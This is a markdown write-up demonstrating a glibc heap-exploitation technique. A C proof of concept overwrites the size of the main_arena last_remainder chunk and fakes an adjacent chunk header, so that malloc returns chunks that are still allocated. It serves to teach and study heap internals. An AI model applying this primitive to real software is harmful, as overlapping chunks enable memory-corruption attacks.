<details>
<summary><strong>Description</strong></summary>
<p>

the purpose of this, is we will leverage the main_arena's last_remainder, to reallocate heap chunks that have not been freed...
> you will find it different with unsortedbin exact fit!

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *start_chunk, *end_chunk, *chunk0, *chunk1, *chunk2, *reallocated_chunk0, *reallocated_chunk1, *reallocated_chunk2;

    // the goal this time, will be to reallocate heap chunks, without freeing them
    // we will do this via leveraging the main_arena last_remainder
    // the last remainder is the leftover of a chunk allocated from the all bin searching
    // once there is a last_remainder, we will expand its size via overwriting the chunk header size
    // the expanded size will include the other chunks
    // then we will just allocate from it, to get the other allocated chunks

    start_chunk = malloc(0x5F0); // let's start off with allocating our chunks
    chunk0 = malloc(0x80);
    chunk1 = malloc(0x80);
    chunk2 = malloc(0x80);
    end_chunk = malloc(0x80);

    free(start_chunk); // then we will free the 0x600 byte chunk, to insert it into the unsorted bin

    malloc(0x700); // next we will move the chunk over to the large bin

    malloc(0x10); // now that it is in the large bin, we will allocate from it, and get a last reminder

    /*VULNERABILITY*/
    start_chunk[3] = 0x7a1; // now we will expand the size of the last_remainder chunk
    /*VULNERABILITY*/

    // start_chunk[2] = 0x000; // last_remainder prev_size (usually we dont need to care about this)

    // we need a chunk_header with the same prev_size (and prev_inuse flag not set) right after the expanded chunk, to pass checks
    // this two fields need to fengshui depend on expanded size
    end_chunk[0] = 0x7a0; // fake adjacent chunk prev_size
    end_chunk[1] = 0x080; // fake adjacent chunk size

    malloc(0x5d0); // allocate an amount, to lineup the last_remainder with chunk0
    reallocated_chunk0 = malloc(0x80); // reallocate chunk0
    reallocated_chunk1 = malloc(0x80); // reallocate chunk1
    reallocated_chunk2 = malloc(0x80); // reallocate chunk2

    printf("chunk0: %p and reallocated_chunk0: %p\n", chunk0, reallocated_chunk0);
    printf("chunk1: %p and reallocated_chunk1: %p\n", chunk1, reallocated_chunk1);
    printf("chunk2: %p and reallocated_chunk2: %p\n", chunk2, reallocated_chunk2);
}
```

</p>
</details>

<details>
<summary><strong>Explain</strong></summary>
<p>

so for this, our goal will be to reallocate chunks 0-2, leveraging the main arena's last remainder.

the last_remainder is a chunk, which is actually stored in the main_arena. The last_remainder is set, when a chunk is allocated using the all bin functionallity, and the remainder from that chunk is large enough to warrant a last_remainder. The last_remainder chunk will be inserted into the unsorted bin.

**when the last_remainder chunk is the only chunk in the unsorted bin, malloc can actually continually break off smaller pieces of it, and allocate those smaller chunks. We will leverage this functionallity**.

how we will accomplish our goal is by doing this. We will have a chunk, become the last_remainder, that is before the areas we want to allocate. We will expand it's size via overwriting the chunk size, to encompass the areas we want to allocate. Right after that chunk, we will set a fake chunk header, with a prev_size that matches our expanded last_remainder chunk size, and a chunk size that has the prev_inuse bit flag not set (and hopefully lines up with the next chunk, to avoid potential issues).

then simply, we will first allocate a chunk from the last_remainder, to line it up with chunk0 (0x5d0). Then, we will simply reallocate chunk0/chunk1/chunk2 (they are all directly adjacent, no alignment allocations in between necissary).

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/unsorted_bin/last_remainder/readme.md
- https://github.com/guyinatuxedo/Shogun/blob/main/heap_demos/large_bin/all_bin_searching/readme.md

</p>
</details>